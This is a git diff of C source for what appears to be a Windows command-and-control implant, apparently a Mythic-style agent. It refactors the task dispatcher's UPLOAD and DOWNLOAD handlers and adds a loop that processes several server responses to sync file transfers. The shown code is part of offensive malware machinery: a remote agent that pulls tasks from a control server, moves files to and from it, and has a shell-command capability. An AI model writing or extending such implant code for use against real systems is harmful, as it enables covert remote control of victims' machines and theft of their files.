@@ -103,6 +103,15 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("DOWNLOAD_CMD was called");
             Download(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_UPLOAD
+        case UPLOAD_CMD:
+        {
+            _dbg("UPLOAD_CMD was called");
+            Upload(taskUuid, taskParser);
+            return;
 
             // Freed inside of thread function
             // TASK_PARAMETER* tp = (TASK_PARAMETER*)LocalAlloc(LPTR, sizeof(TASK_PARAMETER));
@@ -125,9 +134,9 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             // ParserNew(tp->TaskParser, taskParser->Buffer, taskParser->Length);
 
             // // Threaded so it doesn't block main thread (usually needs alot of requests).
-            // HANDLE hThread = CreateThread(NULL, 0, DownloadThread, (LPVOID)tp, 0, NULL);
+            // HANDLE hThread = CreateThread(NULL, 0, UploadThread, (LPVOID)tp, 0, NULL);
             // if (!hThread) {
-            //     _err("Failed to create download thread");
+            //     _err("Failed to create upload thread");
             //     free(tp->TaskUuid);
             //     ParserDestroy(tp->TaskParser);
             //     LocalFree(tp);
@@ -135,46 +144,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             //     CloseHandle(hThread); // Let the thread run independently
             // }
             
-            return;
-        }
-#endif
-#ifdef INCLUDE_CMD_UPLOAD
-        case UPLOAD_CMD:
-        {
-            _dbg("UPLOAD_CMD was called");
-
-            // Freed inside of thread function
-            TASK_PARAMETER* tp = (TASK_PARAMETER*)LocalAlloc(LPTR, sizeof(TASK_PARAMETER));
-            if (!tp)
-            {
-                _err("Failed to allocate memory for task parameter.");
-                return;
-            }
-
-            tp->TaskParser = (PPARSER)LocalAlloc(LPTR, sizeof(PARSER));
-            if (!tp->TaskParser) {
-                _err("Failed to allocate memory for TaskParser.");
-                free(tp->TaskUuid);
-                LocalFree(tp);
-                return;
-            }
-
-            // Duplicate so we don't use values that are freed before the thread finishes
-            tp->TaskUuid = _strdup(taskUuid);
-            ParserNew(tp->TaskParser, taskParser->Buffer, taskParser->Length);
-
-            // Threaded so it doesn't block main thread (usually needs alot of requests).
-            HANDLE hThread = CreateThread(NULL, 0, UploadThread, (LPVOID)tp, 0, NULL);
-            if (!hThread) {
-                _err("Failed to create upload thread");
-                free(tp->TaskUuid);
-                ParserDestroy(tp->TaskParser);
-                LocalFree(tp);
-            } else {
-                CloseHandle(hThread); // Let the thread run independently
-            }
-            
-            return;
+            // return;
         }
 #endif
 #ifdef INCLUDE_CMD_SHELL
@@ -367,53 +337,71 @@ VOID TaskProcess(PPARSER tasks)
  */
 VOID TaskProcessResponses(PPARSER Response)
 {
-    /* 
-        TODO 
-        - Handle multiple responses here
-        {
-            "action":"post_response",
-            "responses":[
-                {
-                    "file_id":"",
-                    "status":"success",
-                    "task_id":""
-                },
-                {
-                    more
-                }
-            ]
-        }
-    */
-
-    SIZE_T fidLen       = TASK_UUID_SIZE;
-    SIZE_T tidLen       = TASK_UUID_SIZE;
-    PCHAR  FileUuid     = NULL;
-    PCHAR  TaskUuid     = NULL;
-    BYTE   Type         = NULL;
     BYTE   Status       = NULL;
+    UINT32 NumResponse  = 1;
+    
+    Status              = ParserGetByte(Response);          // I forget what this is
 
-    Status              = ParserGetByte(Response);
-    Status              = ParserGetByte(Response);
-    Type                = ParserGetByte(Response);
-    TaskUuid            = ParserStringCopy(Response, &tidLen);
-
-    _dbg("TaskUuid: %d bytes length - %s", tidLen, TaskUuid);
-
-    if ( Type == DOWNLOAD_RESP )
+    while ( Response->Length > 0 )
     {
-        FileUuid = ParserStringCopy(Response, &fidLen);
+        SIZE_T fidLen       = TASK_UUID_SIZE;
+        SIZE_T tidLen       = TASK_UUID_SIZE;
+        PCHAR  FileUuid     = NULL;
+        PCHAR  TaskUuid     = NULL;
+        BYTE   Type         = NULL;
 
-        if ( !DownloadUpdateFileUuid(TaskUuid, FileUuid) ) {
-            _err("Failed to update download file ID.");
+        Status              = ParserGetByte(Response);
+        Type                = ParserGetByte(Response);
+        TaskUuid            = ParserStringCopy(Response, &tidLen);
+
+        _dbg("[%s] Handling response # %d", TaskUuid, NumResponse);
+
+        if ( Type == NORMAL_RESP )
+        {
+            _dbg("NORMAL RESPONSE PACKET");
+            goto CLEANUP;
         }
+
+#if defined(INCLUDE_CMD_DOWNLOAD)
+
+        if ( Type == DOWNLOAD_RESP )
+        {
+            _dbg("DOWNLOAD RESPONSE PACKET");
+
+            FileUuid = ParserStringCopy(Response, &fidLen);
+
+            if ( !DownloadSync(TaskUuid, FileUuid) ) 
+            {
+                _err("Failed to update download file ID.");
+            }
+        }
+
+#endif
+#if defined(INCLUDE_CMD_UPLOAD)
+
+        if ( Type == UPLOAD_RESP )
+        {
+            _dbg("UPLOAD RESPONSE PACKET");
+            
+            if ( !UploadSync(TaskUuid, Response) ) 
+            {
+                _err("Failed to sync file bytes.");
+            }
+        }
+
+#endif
+
+        /* P2P Details */
+
+CLEANUP:
+
+        /* Clean Up */
+        if (FileUuid) LocalFree(FileUuid);
+        if (TaskUuid) LocalFree(TaskUuid);
+
+        NumResponse++;
     }
-
-    /* Upload etc */
-
-
-    /* Clean Up */
-    if (FileUuid) LocalFree(FileUuid);
-    if (TaskUuid) LocalFree(TaskUuid);
+    
 }
 
 VOID TaskRoutine()
@@ -423,20 +411,21 @@ VOID TaskRoutine()
     "packages" and make delegates a package task. DELEGATE_FORWARD
 */
 
-    PARSER Test = { 0 };
-    if ( PackageSendAll(&Test) )
-    {
-        if ( Test.Buffer != NULL )
-        {
-            _dbg("Response from PackageSendALL");
-            print_bytes(Test.Buffer, Test.Length);
 
-            TaskProcessResponses(&Test);
+    /* Send Msgs from the Queue */
+    PARSER Output = { 0 };
+    if ( PackageSendAll(&Output) )
+    {
+        if ( Output.Buffer != NULL )
+        {
+            // _dbg("Response from PackageSendALL");
+            // print_bytes(Output.Buffer, Output.Length);
+
+            TaskProcessResponses(&Output);
         }
     }
-    
 
-    if (&Test != NULL) ParserDestroy(&Test);
+    if (&Output != NULL) ParserDestroy(&Output);
 
 
     /* Ask server for new tasks */
